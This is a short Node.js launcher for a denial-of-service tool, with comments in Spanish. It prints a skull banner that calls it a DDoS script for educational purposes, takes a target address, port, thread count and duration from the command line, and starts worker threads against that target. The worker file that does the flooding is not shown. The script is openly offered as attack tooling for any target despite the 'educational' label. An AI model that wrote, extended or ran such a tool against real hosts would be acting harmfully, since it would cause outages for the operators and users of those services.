const { Worker } = require('worker_threads');

console.log(`       
            
　　　⣀⠤⠔⠒⠒⠒⠒⠒⠒⠒⠦⢄⣀⠀⠀⠀⠀
　⢀⡴⠋　　　　　　　　⠈⠑⢄⠀⠀
⢀⠎　　　　　　　　　　　⠈⢣⠀
⢸　⡄　　　　　　　　　　⢢⠈⡇
⢸　⣇　　　　　　　　　　⡼　⡇
⠘⡆⢸　⢀⣀⣤⣄⡀　　⢀⣤⣤⣄⡀　⡇⡸⠀
　⠘⣾⠀⣿⣿⣿⣿⣿　　⣿⣿⣿⣿⣿　⡗⠁⠀
　⢸⣿⠀⠙⢿⣿⠿⠃⢠⢠⡀⠙⠿⣿⠿⠃　⡇⠀⠀
　⠁⢸⣄　　　⢠⣿⢸⣿⠀⠀⠀⠀⠀⣠⠇⠀⠀
　　⡏⢷⡄　　⠘⠟⠈⠿⠁⠀⠀⢠⡞⡹⠁⠀⠀⠀
　　⢹⠀⠸⠘⢢⢠⠤⠤⡤⡄⢰⢡⠁⠀⡇⠀⠀⠀⠀
　　⢸⠀⠀⠣⣹⢸⠒⠒⡗⡇⣩⠌⢀⠀⡇⠀⠀⠀⠀
　　⠈⢧⡀⠀⠀⠉⠉⠉⠉⠁⠀⠀⣀⠜⠀⠀⠀⠀⠀
　　　　⠉⠓⠢⠤⠤⠤⠔⠊⠁⠀⠀⠀⠀⠀⠀ 
            
                  DDOS Script para fines educativos
`)

const [node, dir, address, port, threads = 4, time = 5] = process.argv;

if (!address || !port) {
  return console.log('[ERROR] Use: \'node . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
}

for (let i = 0; i < threads; i++) {
  console.log(`[DDOS] Comenzando thread #${i}...`)

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time,
    thread: i
  });
}

console.log("[DDOS] Comenzando en 3 segundos...")
